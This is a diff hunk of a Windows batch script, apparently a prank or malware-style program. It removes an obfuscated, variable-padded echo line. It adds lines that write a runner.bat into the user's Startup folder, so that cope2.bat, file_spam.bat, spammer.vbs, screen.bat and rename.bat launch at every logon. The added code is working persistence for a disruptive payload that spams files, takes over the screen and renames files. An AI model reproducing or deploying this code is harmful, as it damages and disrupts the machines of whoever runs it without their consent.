@@ -161,14 +161,17 @@ echo :x >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\S
 
 
 
-e%nutvpidfc%c%jjsjc%h%bxbjkt%o%plhfsfwyg% %ybkd%t%lindswf%h%aejlzufw%i%qczv%s%gmbdhor% %rso%w%hpale%a%xrzorkb%s%ljrjqjcz% %jjwpam%m%wbkd%a%eqock%d%tlbzwov%e%cwsy% %jmwxxmfa%b%pppyl%y%wlwtlmjnk% %vlay%l%dxwd%u%mbb%x%esjf%s%ykr%
+echo start /min cope2.bat >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
+echo start /min file_spam.bat>>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
+echo start /min spammer.vbs >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
+echo start notepad >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
+echo start /max screen.bat >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
+echo timeout 6 >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
+echo start /min rename.bat >>%userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
 
-cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup
-start /min cope2.bat
-start /min rename.bat 
-start /min file_spam.bat
-timeout 5
-start /min spammer.vbs
-start /max 
-start notepad
-start /max screen.bat
+timeout 1
+
+cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start^ Menu\Programs\Startup\runner.bat
+
+
+
